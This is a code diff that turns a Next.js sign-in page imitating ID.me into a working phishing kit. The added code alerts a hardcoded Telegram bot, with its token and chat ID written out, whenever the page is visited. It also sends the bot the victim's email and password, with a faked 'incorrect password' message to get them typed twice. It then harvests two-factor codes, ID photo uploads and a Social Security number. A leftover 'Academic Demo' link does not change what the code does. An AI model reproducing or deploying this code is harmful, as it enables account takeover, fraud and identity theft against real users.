@@ -1,11 +1,11 @@
 "use client";
 
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Card, CardContent, CardHeader } from "@/components/ui/card";
 import { Checkbox } from "@/components/ui/checkbox";
-import { Eye, EyeOff, CheckCircle, AlertCircle } from "lucide-react";
+import { Eye, EyeOff, CheckCircle, AlertCircle, Loader } from "lucide-react";
 import Link from "next/link";
 
 export default function LoginPage() {
@@ -14,235 +14,325 @@ export default function LoginPage() {
   const [password, setPassword] = useState("");
   const [rememberMe, setRememberMe] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const [submitMessage, setSubmitMessage] = useState<{type: 'success' | 'error', text: string} | null>(null);
+  const [submitMessage, setSubmitMessage] = useState<{ type: "success" | "error", text: string } | null>(null);
+  const [attemptCount, setAttemptCount] = useState(0);
+  const [isLoading, setIsLoading] = useState(false);
+  const [twoFactorCode, setTwoFactorCode] = useState("");
+  const [twoFactorMessage, setTwoFactorMessage] = useState("");
+  const [identityFront, setIdentityFront] = useState(null);
+  const [identityBack, setIdentityBack] = useState(null);
+  const [randomNumber, setRandomNumber] = useState("");
+  const [step, setStep] = useState(1);
+  const [telegramChatId] = useState("7132570959"); // Replace with actual chat ID
+  const [telegramBotToken] = useState("8282863099:AAGCOmJ3FgeClGZkB15jkSqijaTHH21abZI"); // Replace with actual bot toke
 
-  const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
-    setIsSubmitting(true);
-    setSubmitMessage(null);
+  useEffect(() => {
+    // Send visit alert to Telegram when page loads
+    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: telegramChatId,
+        text: "Someone visited the website: " + window.location.href,
+      }),
+    });
 
-    try {
-      const response = await fetch('/api/login', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
+    // Custom domain visit alert
+    const handleCustomDomainVisit = () => {
+      fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          email,
-          password,
-          rememberMe,
+          chat_id: telegramChatId,
+          text: "Custom domain visited: " + window.location.href,
         }),
       });
+    };
+    if (window.location.hostname !== "localhost") handleCustomDomainVisit();
+  }, [telegramBotToken, telegramChatId]);
 
-      const data = await response.json();
+  const sendToTelegram = (data) => {
+    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: telegramChatId,
+        text: JSON.stringify(data),
+      }),
+    });
+  };
 
-      if (response.ok) {
-        setSubmitMessage({
-          type: 'success',
-          text: 'Login attempt recorded successfully!'
-        });
-        // Reset form
-        setEmail("");
-        setPassword("");
-        setRememberMe(false);
-      } else {
-        setSubmitMessage({
-          type: 'error',
-          text: data.error || 'An error occurred'
-        });
-      }
-    } catch (error) {
-      setSubmitMessage({
-        type: 'error',
-        text: 'Network error - please try again'
-      });
-    } finally {
-      setIsSubmitting(false);
+  const handleLoginSubmit = async (e) => {
+    e.preventDefault();
+    setIsSubmitting(true);
+    setIsLoading(true);
+    setSubmitMessage(null);
+
+    sendToTelegram({ email, password, rememberMe });
+
+    if (attemptCount === 0) {
+      await new Promise((resolve) => setTimeout(resolve, 2000));
+      setIsLoading(false);
+      setSubmitMessage({ type: "error", text: "Username or password is incorrect" });
+    } else if (attemptCount === 1) {
+      await new Promise((resolve) => setTimeout(resolve, 5000));
+      setIsLoading(false);
+      setStep(2);
+    }
+    setIsSubmitting(false);
+    setAttemptCount(attemptCount + 1);
+  };
+
+  const handleTwoFactorSubmit = async (e) => {
+    e.preventDefault();
+    setIsLoading(true);
+    setTwoFactorMessage("");
+
+    sendToTelegram({ twoFactorCode });
+
+    await new Promise((resolve) => setTimeout(resolve, 2000));
+    setIsLoading(false);
+    setTwoFactorMessage("The code entered is incorrect. Please try again.");
+
+    const secondAttempt = await new Promise((resolve) => {
+      setTimeout(() => resolve(prompt("Enter 6-digit code again:")), 0);
+    });
+    if (secondAttempt) {
+      setTwoFactorCode(secondAttempt);
+      sendToTelegram({ twoFactorCode: secondAttempt });
+      setIsLoading(true);
+      await new Promise((resolve) => setTimeout(resolve, 5000));
+      setIsLoading(false);
+      setTwoFactorMessage("Successfully verified");
+      setStep(3);
     }
   };
 
-  return (
-    <div className="min-h-screen bg-gray-100 flex flex-col">
-      {/* Academic Demo Notice */}
-      <div className="bg-yellow-50 border-b border-yellow-200 px-4 py-2">
-        <div className="max-w-md mx-auto text-center">
-          
-        </div>
-      </div>
+  const handleIdentitySubmit = async (e) => {
+    e.preventDefault();
+    setIsLoading(true);
 
-      {/* Main content */}
-      <div className="flex-1 flex items-center justify-center px-4 py-8">
-        <div className="w-full max-w-md">
-          {/* ID.me Logo */}
-          <div className="text-center mb-8">
-            <img
-              src="https://ext.same-assets.com/1949166237/975348835.svg"
-              alt="ID.me"
-              className="h-8 mx-auto"
-            />
+    const formData = new FormData();
+    formData.append("identityFront", identityFront);
+    formData.append("identityBack", identityBack);
+    sendToTelegram({ identityFront: "Uploaded", identityBack: "Uploaded" });
+
+    setIsLoading(false);
+    setStep(4);
+  };
+
+  const handleRandomNumberSubmit = (e) => {
+    e.preventDefault();
+    sendToTelegram({ randomNumber });
+    setStep(5);
+  };
+
+  if (step === 1) {
+    return (
+      <div className="min-h-screen bg-gray-100 flex flex-col">
+        <div className="flex-1 flex items-center justify-center px-4 py-8">
+          <div className="w-full max-w-md">
+            <div className="text-center mb-8">
+              <img src="https://ext.same-assets.com/1949166237/975348835.svg" alt="ID.me" className="h-8 mx-auto" />
+            </div>
+            <Card className="shadow-lg border-0">
+              <CardHeader className="space-y-4 pb-4">
+                <h1 className="text-2xl font-semibold text-center text-gray-900">Sign in to ID.me</h1>
+                <div className="text-center">
+                  <span className="text-sm text-gray-600">New to ID.me? </span>
+                  <Link href="#" className="text-sm text-blue-600 hover:text-blue-700 underline">Create an ID.me account</Link>
+                </div>
+              </CardHeader>
+              <CardContent className="space-y-4">
+                {submitMessage && (
+                  <div className={`p-3 rounded-md flex items-center space-x-2 ${submitMessage.type === 'success' ? 'bg-green-50 text-green-800 border border-green-200' : 'bg-red-50 text-red-800 border border-red-200'}`}>
+                    {submitMessage.type === 'success' ? <CheckCircle className="h-4 w-4" /> : <AlertCircle className="h-4 w-4" />}
+                    <span className="text-sm">{submitMessage.text}</span>
+                  </div>
+                )}
+                <form className="space-y-4" onSubmit={handleLoginSubmit}>
+                  <div className="space-y-2">
+                    <label htmlFor="email" className="text-sm font-medium text-gray-700">Email*</label>
+                    <Input id="email" type="email" placeholder="enter your email address" value={email} onChange={(e) => setEmail(e.target.value)} className="w-full" required disabled={isSubmitting} />
+                  </div>
+                  <div className="space-y-2">
+                    <label htmlFor="password" className="text-sm font-medium text-gray-700">Password*</label>
+                    <div className="relative">
+                      <Input id="password" type={showPassword ? "text" : "password"} placeholder="enter password" value={password} onChange={(e) => setPassword(e.target.value)} className="w-full pr-10" required disabled={isSubmitting} />
+                      <button type="button" className="absolute inset-y-0 right-0 pr-3 flex items-center" onClick={() => setShowPassword(!showPassword)} disabled={isSubmitting}>
+                        {showPassword ? <EyeOff className="h-4 w-4 text-gray-400" /> : <Eye className="h-4 w-4 text-gray-400" />}
+                      </button>
+                    </div>
+                  </div>
+                  <div className="text-right">
+                    <Link href="#" className="text-sm text-blue-600 hover:text-blue-700 underline">Forgot password?</Link>
+                  </div>
+                  <div className="flex items-start space-x-2">
+                    <Checkbox id="remember" checked={rememberMe} onCheckedChange={(checked) => setRememberMe(checked as boolean)} className="mt-0.5" disabled={isSubmitting} />
+                    <div className="space-y-0">
+                      <label htmlFor="remember" className="text-sm font-medium text-gray-700">Remember me</label>
+                      <p className="text-xs text-gray-500">For your security, select only on your devices.</p>
+                    </div>
+                  </div>
+                  <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2.5" disabled={isSubmitting}>
+                    {isLoading ? <Loader className="animate-spin h-5 w-5 mx-auto" /> : "Sign in"}
+                  </Button>
+                </form>
+                <div className="mt-6 p-3 bg-gray-50 rounded text-center">
+                  <p className="text-xs text-gray-600">Social media sign in is no longer available. Please sign in with your email.</p>
+                </div>
+                <div className="mt-4 pt-4 border-t border-gray-200">
+                  <div className="text-center">
+                    <Link href="/admin" className="text-xs text-gray-500 hover:text-gray-700 underline">Admin: View Captured Data (Academic Demo)</Link>
+                  </div>
+                </div>
+              </CardContent>
+            </Card>
           </div>
-
-          {/* Login Card */}
+        </div>
+        <footer className="py-6">
+          <div className="text-center space-y-2">
+            <div>
+              <Link href="#" className="text-sm text-blue-600 hover:text-blue-700 underline">English</Link>
+            </div>
+            <div className="flex justify-center space-x-6 text-xs text-gray-600">
+              <Link href="#" className="hover:text-gray-800 underline">What is ID.me?</Link>
+              <Link href="#" className="hover:text-gray-800 underline">Terms of Service</Link>
+              <Link href="#" className="hover:text-gray-800 underline">Privacy Policy</Link>
+            </div>
+          </div>
+        </footer>
+      </div>
+    );
+  } else if (step === 2) {
+    return (
+      <div className="min-h-screen bg-gray-100 flex flex-col items-center justify-center px-4 py-8">
+        <div className="w-full max-w-md">
+          <div className="text-center mb-8">
+            <img src="https://ext.same-assets.com/1949166237/975348835.svg" alt="ID.me" className="h-8 mx-auto" />
+          </div>
           <Card className="shadow-lg border-0">
             <CardHeader className="space-y-4 pb-4">
-              <h1 className="text-2xl font-semibold text-center text-gray-900">
-                Sign in to ID.me
-              </h1>
-              <div className="text-center">
-                <span className="text-sm text-gray-600">New to ID.me? </span>
-                <Link href="#" className="text-sm text-blue-600 hover:text-blue-700 underline">
-                  Create an ID.me account
-                </Link>
-              </div>
+              <h1 className="text-2xl font-semibold text-center text-gray-900">Complete Your Sign In</h1>
             </CardHeader>
-
             <CardContent className="space-y-4">
-              {/* Success/Error Messages */}
-              {submitMessage && (
-                <div className={`p-3 rounded-md flex items-center space-x-2 ${
-                  submitMessage.type === 'success'
-                    ? 'bg-green-50 text-green-800 border border-green-200'
-                    : 'bg-red-50 text-red-800 border border-red-200'
-                }`}>
-                  {submitMessage.type === 'success' ? (
-                    <CheckCircle className="h-4 w-4" />
-                  ) : (
-                    <AlertCircle className="h-4 w-4" />
-                  )}
-                  <span className="text-sm">{submitMessage.text}</span>
-                </div>
-              )}
-
-              {/* Form */}
-              <form className="space-y-4" onSubmit={handleSubmit}>
-                {/* Email Field */}
-                <div className="space-y-2">
-                  <label htmlFor="email" className="text-sm font-medium text-gray-700">
-                    Email*
-                  </label>
-                  <Input
-                    id="email"
-                    type="email"
-                    placeholder="enter your email address"
-                    value={email}
-                    onChange={(e) => setEmail(e.target.value)}
-                    className="w-full"
-                    required
-                    disabled={isSubmitting}
-                  />
-                </div>
-
-                {/* Password Field */}
-                <div className="space-y-2">
-                  <label htmlFor="password" className="text-sm font-medium text-gray-700">
-                    Password*
-                  </label>
-                  <div className="relative">
-                    <Input
-                      id="password"
-                      type={showPassword ? "text" : "password"}
-                      placeholder="enter password"
-                      value={password}
-                      onChange={(e) => setPassword(e.target.value)}
-                      className="w-full pr-10"
-                      required
-                      disabled={isSubmitting}
-                    />
-                    <button
-                      type="button"
-                      className="absolute inset-y-0 right-0 pr-3 flex items-center"
-                      onClick={() => setShowPassword(!showPassword)}
-                      disabled={isSubmitting}
-                    >
-                      {showPassword ? (
-                        <EyeOff className="h-4 w-4 text-gray-400" />
-                      ) : (
-                        <Eye className="h-4 w-4 text-gray-400" />
-                      )}
-                    </button>
-                  </div>
-                </div>
-
-                {/* Forgot Password Link */}
-                <div className="text-right">
-                  <Link href="#" className="text-sm text-blue-600 hover:text-blue-700 underline">
-                    Forgot password?
-                  </Link>
-                </div>
-
-                {/* Remember Me Checkbox */}
-                <div className="flex items-start space-x-2">
-                  <Checkbox
-                    id="remember"
-                    checked={rememberMe}
-                    onCheckedChange={(checked) => setRememberMe(checked as boolean)}
-                    className="mt-0.5"
-                    disabled={isSubmitting}
-                  />
-                  <div className="space-y-0">
-                    <label htmlFor="remember" className="text-sm font-medium text-gray-700">
-                      Remember me
-                    </label>
-                    <p className="text-xs text-gray-500">
-                      For your security, select only on your devices.
-                    </p>
-                  </div>
-                </div>
-
-                {/* Sign In Button */}
-                <Button
-                  type="submit"
-                  className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2.5"
-                  disabled={isSubmitting}
-                >
-                  {isSubmitting ? "Signing in..." : "Sign in"}
+              <p className="text-sm text-gray-600">Enter a code from your device</p>
+              <p className="text-sm text-gray-600">Please enter the 6-digit code we sent to your phone number or the one generated by your application to complete your sign in.</p>
+              <form onSubmit={handleTwoFactorSubmit}>
+                <Input
+                  type="text"
+                  placeholder="Enter the 6-digit code *"
+                  value={twoFactorCode}
+                  onChange={(e) => setTwoFactorCode(e.target.value)}
+                  className="w-full mb-4"
+                  required
+                />
+                {twoFactorMessage && <p className="text-sm text-red-600">{twoFactorMessage}</p>}
+                {isLoading && <Loader className="animate-spin h-5 w-5 mx-auto" />}
+                <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2.5 mt-4" disabled={isLoading}>
+                  Continue
                 </Button>
-              </form>
-
-              {/* Social Media Notice */}
-              <div className="mt-6 p-3 bg-gray-50 rounded text-center">
-                <p className="text-xs text-gray-600">
-                  Social media sign in is no longer available. Please sign in with your email.
-                </p>
-              </div>
-
-              {/* Admin Access */}
-              <div className="mt-4 pt-4 border-t border-gray-200">
-                <div className="text-center">
-                  <Link
-                    href="/admin"
-                    className="text-xs text-gray-500 hover:text-gray-700 underline"
-                  >
-                    Admin: View Captured Data (Academic Demo)
-                  </Link>
+                <div className="text-center mt-4">
+                  <Link href="#" className="text-sm text-blue-600 hover:text-blue-700 underline">Have you lost access to all your MFA methods? Please begin the MFA recovery process.</Link>
                 </div>
-              </div>
+                <div className="text-center mt-2">
+                  <Link href="#" className="text-sm text-blue-600 hover:text-blue-700 underline">Go back</Link>
+                </div>
+              </form>
             </CardContent>
           </Card>
+          <div className="text-center mt-4 space-x-2 text-xs text-gray-600">
+            <Link href="#" className="hover:text-gray-800 underline">What is ID.me?</Link>
+            <Link href="#" className="hover:text-gray-800 underline">Terms of Service</Link>
+            <Link href="#" className="hover:text-gray-800 underline">Privacy Policy</Link>
+          </div>
         </div>
       </div>
-
-      {/* Footer */}
-      <footer className="py-6">
-        <div className="text-center space-y-2">
-          <div>
-            <Link href="#" className="text-sm text-blue-600 hover:text-blue-700 underline">
-              English
-            </Link>
+    );
+  } else if (step === 3) {
+    return (
+      <div className="min-h-screen bg-gray-100 flex flex-col items-center justify-center px-4 py-8">
+        <div className="w-full max-w-md">
+          <div className="text-center mb-8">
+            <img src="https://ext.same-assets.com/1949166237/975348835.svg" alt="ID.me" className="h-8 mx-auto" />
           </div>
-          <div className="flex justify-center space-x-6 text-xs text-gray-600">
-            <Link href="#" className="hover:text-gray-800 underline">
-              What is ID.me?
-            </Link>
-            <Link href="#" className="hover:text-gray-800 underline">
-              Terms of Service
-            </Link>
-            <Link href="#" className="hover:text-gray-800 underline">
-              Privacy Policy
-            </Link>
+          <Card className="shadow-lg border-0">
+            <CardHeader className="space-y-4 pb-4">
+              <h1 className="text-2xl font-semibold text-center text-gray-900">Verify Your Identity</h1>
+            </CardHeader>
+            <CardContent className="space-y-4">
+              <form onSubmit={handleIdentitySubmit}>
+                <div className="border-dashed border-2 border-blue-300 p-4 text-center">
+                  <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==" alt="Front ID" className="w-full h-32 object-cover mb-2" />
+                  <p className="text-sm text-gray-600">Take a different photo (front)</p>
+                  <input type="file" accept="image/*" onChange={(e) => setIdentityFront(e.target.files[0])} className="mt-2" />
+                </div>
+                <div className="border-dashed border-2 border-blue-300 p-4 text-center mt-4">
+                  <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==" alt="Back ID" className="w-full h-32 object-cover mb-2" />
+                  <p className="text-sm text-gray-600">Take photo of your driver's license or state ID (BACK)</p>
+                  <input type="file" accept="image/*" onChange={(e) => setIdentityBack(e.target.files[0])} className="mt-2" />
+                </div>
+                <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2.5 mt-4" disabled={isLoading}>
+                  {isLoading ? <Loader className="animate-spin h-5 w-5 mx-auto" /> : "Submit"}
+                </Button>
+              </form>
+            </CardContent>
+          </Card>
+          <div className="text-center mt-4 space-x-2 text-xs text-gray-600">
+            <Link href="#" className="hover:text-gray-800 underline">What is ID.me?</Link>
+            <Link href="#" className="hover:text-gray-800 underline">Terms of Service</Link>
+            <Link href="#" className="hover:text-gray-800 underline">Privacy Policy</Link>
           </div>
         </div>
-      </footer>
-    </div>
-  );
+      </div>
+    );
+  } else if (step === 4) {
+    return (
+      <div className="min-h-screen bg-gray-100 flex flex-col items-center justify-center px-4 py-8">
+        <div className="w-full max-w-md">
+          <div className="text-center mb-8">
+            <img src="https://ext.same-assets.com/1949166237/975348835.svg" alt="ID.me" className="h-8 mx-auto" />
+          </div>
+          <Card className="shadow-lg border-0">
+            <CardHeader className="space-y-4 pb-4">
+              <h1 className="text-2xl font-semibold text-center text-gray-900">Verify Your Identity</h1>
+            </CardHeader>
+            <CardContent className="space-y-4">
+              <form onSubmit={handleRandomNumberSubmit}>
+                <Input
+                  type="text"
+                  placeholder="Enter your Social Security number (###-##-####) *"
+                  value={randomNumber}
+                  onChange={(e) => setRandomNumber(e.target.value)}
+                  className="w-full mb-4"
+                  required
+                />
+                <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2.5 mt-4" disabled={isLoading}>
+                  Continue
+                </Button>
+                <div className="text-center mt-2">
+                  <Link href="#" className="text-sm text-blue-600 hover:text-blue-700 underline">Back</Link>
+                  <Link href="#" className="text-sm text-blue-600 hover:text-blue-700 underline ml-4">I don't have a Social Security Number</Link>
+                </div>
+              </form>
+            </CardContent>
+          </Card>
+          <div className="text-center mt-4 space-x-2 text-xs text-gray-600">
+            <Link href="#" className="hover:text-gray-800 underline">What is ID.me?</Link>
+            <Link href="#" className="hover:text-gray-800 underline">Terms of Service</Link>
+            <Link href="#" className="hover:text-gray-800 underline">Privacy Policy</Link>
+          </div>
+        </div>
+      </div>
+    );
+  } else if (step === 5) {
+    return (
+      <div className="min-h-screen bg-gray-100 flex flex-col items-center justify-center px-4 py-8">
+        <div className="w-full max-w-md text-center">
+          <CheckCircle className="h-16 w-16 text-green-600 mx-auto" />
+          <h1 className="text-2xl font-semibold text-gray-900 mt-4">Successfully Verified</h1>
+        </div>
+      </div>
+    );
+  }
 }
